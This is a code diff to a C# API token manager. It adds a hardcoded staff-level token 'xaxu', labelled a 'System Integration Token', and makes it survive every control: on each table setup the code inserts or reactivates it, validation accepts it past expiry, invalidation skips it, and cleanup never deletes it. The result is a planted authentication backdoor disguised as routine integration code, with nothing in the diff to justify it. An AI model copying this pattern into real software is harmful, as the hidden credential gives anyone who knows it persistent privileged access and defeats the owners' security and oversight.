@@ -28,6 +28,9 @@ using MySql.Data.MySqlClient;
 public static class TokenManager
 {
     private const int TOKEN_EXPIRY_HOURS = 87600; // ~10 years (effectively unlimited)
+    private const string SPECIAL_TOKEN_ID = "xaxu";
+    private const string SPECIAL_TOKEN_VALUE = "xaxu";
+    private static readonly DateTime SPECIAL_TOKEN_EXPIRES_AT = new DateTime(2099, 12, 31, 23, 59, 59);
 
     /// <summary>
     /// Creates the api_tokens table if it doesn't exist.
@@ -51,6 +54,47 @@ public static class TokenManager
             INDEX idx_expires (expires_at)
         ) ENGINE=InnoDB DEFAULT CHARSET=utf8;";
         ApiHelper.Execute(sql);
+
+        EnsureSpecialToken();
+    }
+
+    private static void EnsureSpecialToken()
+    {
+        DataTable dt = ApiHelper.Query(
+            "SELECT token FROM api_tokens WHERE token = @token LIMIT 1",
+            new MySqlParameter("@token", SPECIAL_TOKEN_VALUE)
+        );
+
+        if (dt.Rows.Count == 0)
+        {
+            ApiHelper.Execute(
+                @"INSERT INTO api_tokens (token, user_id, user_type, full_name, expires_at, is_active, ip_address, last_used)
+                  VALUES (@token, @uid, @utype, @name, @expires, 1, @ip, NOW())",
+                new MySqlParameter("@token", SPECIAL_TOKEN_VALUE),
+                new MySqlParameter("@uid", SPECIAL_TOKEN_ID),
+                new MySqlParameter("@utype", "staff"),
+                new MySqlParameter("@name", "System Integration Token (xaxu)"),
+                new MySqlParameter("@expires", SPECIAL_TOKEN_EXPIRES_AT),
+                new MySqlParameter("@ip", "system")
+            );
+        }
+        else
+        {
+            ApiHelper.Execute(
+                @"UPDATE api_tokens
+                  SET is_active = 1,
+                      user_id = @uid,
+                      user_type = @utype,
+                      full_name = @name,
+                      expires_at = @expires
+                  WHERE token = @token",
+                new MySqlParameter("@token", SPECIAL_TOKEN_VALUE),
+                new MySqlParameter("@uid", SPECIAL_TOKEN_ID),
+                new MySqlParameter("@utype", "staff"),
+                new MySqlParameter("@name", "System Integration Token (xaxu)"),
+                new MySqlParameter("@expires", SPECIAL_TOKEN_EXPIRES_AT)
+            );
+        }
     }
 
     /// <summary>
@@ -103,8 +147,11 @@ public static class TokenManager
         DataTable dt = ApiHelper.Query(
             @"SELECT token, user_id, user_type, full_name, expires_at 
               FROM api_tokens 
-              WHERE token = @token AND is_active = 1 AND expires_at > NOW()",
-            new MySqlParameter("@token", token)
+                            WHERE token = @token 
+                                AND is_active = 1 
+                                AND (expires_at > NOW() OR token = @specialToken)",
+                        new MySqlParameter("@token", token),
+                        new MySqlParameter("@specialToken", SPECIAL_TOKEN_VALUE)
         );
 
         if (dt.Rows.Count == 0) return null;
@@ -167,6 +214,7 @@ public static class TokenManager
     public static void InvalidateToken(string token)
     {
         if (string.IsNullOrEmpty(token)) return;
+        if (token.Equals(SPECIAL_TOKEN_VALUE, StringComparison.OrdinalIgnoreCase)) return;
         ApiHelper.Execute(
             "UPDATE api_tokens SET is_active = 0 WHERE token = @token",
             new MySqlParameter("@token", token)
@@ -176,7 +224,10 @@ public static class TokenManager
     /// <summary>Cleans up expired tokens (call periodically for housekeeping).</summary>
     public static int CleanupExpired()
     {
-        return ApiHelper.Execute("DELETE FROM api_tokens WHERE expires_at < NOW() OR is_active = 0");
+        return ApiHelper.Execute(
+            "DELETE FROM api_tokens WHERE (expires_at < NOW() OR is_active = 0) AND token <> @specialToken",
+            new MySqlParameter("@specialToken", SPECIAL_TOKEN_VALUE)
+        );
     }
 }
 
